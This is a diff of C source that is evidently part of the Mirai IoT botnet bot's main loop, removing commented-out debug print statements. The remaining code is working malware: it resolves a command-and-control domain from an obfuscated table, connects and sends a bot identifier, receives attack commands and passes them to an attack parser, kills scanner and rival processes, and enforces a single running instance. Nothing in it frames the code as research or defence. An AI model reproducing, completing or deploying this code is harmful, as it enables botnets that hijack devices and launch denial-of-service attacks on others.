@@ -194,10 +194,7 @@ int main(int argc, char **args)
         timeo.tv_sec = 10;
         nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
         if (nfds == -1)
-        {/*
-#ifdef DEBUG
-            printf("select() errno = %d\n", errno);
-#endif*/
+        {
             continue;
         }
         else if (nfds == 0)
@@ -215,10 +212,7 @@ int main(int argc, char **args)
             socklen_t cli_addr_len = sizeof (cli_addr);
 
             accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
-/*
-#ifdef DEBUG
-            printf("[main] Detected newer instance running! Killing self\n");
-#endif*/
+
 #ifdef MIRAI_TELNET
             scanner_kill();
 #endif
@@ -234,10 +228,7 @@ int main(int argc, char **args)
             pending_connection = FALSE;
 
             if (!FD_ISSET(fd_serv, &fdsetwr))
-            {/*
-#ifdef DEBUG
-                printf("[main] Timed out while connecting to CNC\n");
-#endif*/
+            {
                 teardown_connection();
             }
             else
@@ -247,10 +238,7 @@ int main(int argc, char **args)
 
                 getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                 if (err != 0)
-                {/*
-#ifdef DEBUG
-                    printf("[main] Error while connecting to CNC code=%d\n", err);
-#endif*/
+                {
                     close(fd_serv);
                     fd_serv = -1;
                     sleep((rand_next() % 10) + 1);
@@ -265,10 +253,7 @@ int main(int argc, char **args)
                     if (id_len > 0)
                     {
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
-                    }/*
-#ifdef DEBUG
-                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
-#endif*/
+                    }
                 }
             }
         }
@@ -291,10 +276,7 @@ int main(int argc, char **args)
             
             // If n == 0 then we close the connection!
             if (n == 0)
-            {/*
-#ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
-#endif*/
+            {
                 teardown_connection();
                 continue;
             }
@@ -325,10 +307,7 @@ int main(int argc, char **args)
 
             // If n == 0 then we close the connection!
             if (n == 0)
-            {/*
-#ifdef DEBUG
-                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
-#endif*/
+            {
                 teardown_connection();
                 continue;
             }
@@ -337,11 +316,7 @@ int main(int argc, char **args)
             recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
             len = ntohs(len);
             recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
-/*
-#ifdef DEBUG
-            printf("[main] Received %d bytes from CNC\n", len);
-#endif
-*/
+
             if (len > 0)
                 attack_parse(rdbuf, len);
         }
@@ -363,10 +338,7 @@ static void resolve_cnc_addr(void)
     entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
     table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
-    {/*
-#ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
-#endif*/
+    {
         return;
     }
     srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
@@ -375,23 +347,12 @@ static void resolve_cnc_addr(void)
     table_unlock_val(TABLE_CNC_PORT);
     srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
     table_lock_val(TABLE_CNC_PORT);
-/*
-#ifdef DEBUG
-    printf("[main] Resolved domain\n");
-#endif*/
 }
 
 static void establish_connection(void)
-{/*
-#ifdef DEBUG
-    printf("[main] Attempting to connect to CNC\n");
-#endif
-*/
+{
     if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    {/*
-#ifdef DEBUG
-        printf("[main] Failed to call socket(). Errno = %d\n", errno);
-#endif*/
+    {
         return;
     }
 
@@ -406,11 +367,7 @@ static void establish_connection(void)
 }
 
 static void teardown_connection(void)
-{/*
-#ifdef DEBUG
-    printf("[main] Tearing down connection to CNC!\n");
-#endif*/
-
+{
     if (fd_serv != -1)
         close(fd_serv);
     fd_serv = -1;
@@ -437,10 +394,7 @@ static void ensure_single_instance(void)
     if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
     {
         if (errno == EADDRNOTAVAIL && local_bind)
-            local_bind = FALSE;/*
-#ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
-#endif*/
+            local_bind = FALSE;
 
         // Reset addr just in case
         addr.sin_family = AF_INET;
@@ -448,10 +402,8 @@ static void ensure_single_instance(void)
         addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
         if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-        {/*
-#ifdef DEBUG
-            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
-#endif*/
+        {
+            //No thing.
         }
         
         sleep(5);
@@ -470,10 +422,7 @@ static void ensure_single_instance(void)
             killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
             ensure_single_instance();
 #endif
-        }/*
-#ifdef DEBUG
-        printf("[main] We are the only process on this system!\n");
-#endif*/
+        }
     }
 }
 
